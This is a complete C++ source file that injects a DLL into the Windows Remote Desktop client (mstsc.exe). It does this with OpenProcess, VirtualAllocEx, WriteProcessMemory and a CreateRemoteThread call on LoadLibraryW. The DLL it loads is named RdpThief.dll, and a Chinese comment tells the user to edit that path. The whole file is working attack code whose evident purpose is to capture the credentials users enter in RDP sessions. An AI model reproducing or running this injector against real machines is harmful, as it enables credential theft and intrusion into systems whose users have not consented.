#define _CRT_SECURE_NO_DEPRECATE

#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>

DWORD getPPID(LPCWSTR processName) {
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 process = { 0 };
	process.dwSize = sizeof(process);

	if (Process32First(snapshot, &process)) {
		do {
			if (!wcscmp(process.szExeFile, processName))
				break;
		} while (Process32Next(snapshot, &process));
	}

	CloseHandle(snapshot);
	return process.th32ProcessID;
}

int main() {
	HANDLE processHandle;
	PVOID remoteBuffer;
	// 修改这里的dll路径
	wchar_t dllPath[] = TEXT("E:\\code\\RdpThief\\x64\\Release\\RdpThief.dll");

	LPCWSTR parentProcess = L"mstsc.exe";
	DWORD parentPID = getPPID(parentProcess);

	processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, parentPID);
	remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof dllPath, MEM_COMMIT, PAGE_READWRITE);
	WriteProcessMemory(processHandle, remoteBuffer, (LPVOID)dllPath, sizeof dllPath, NULL);
	PTHREAD_START_ROUTINE threatStartRoutineAddress = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "LoadLibraryW");
	CreateRemoteThread(processHandle, NULL, 0, threatStartRoutineAddress, remoteBuffer, 0, NULL);
	CloseHandle(processHandle);

	return 0;
}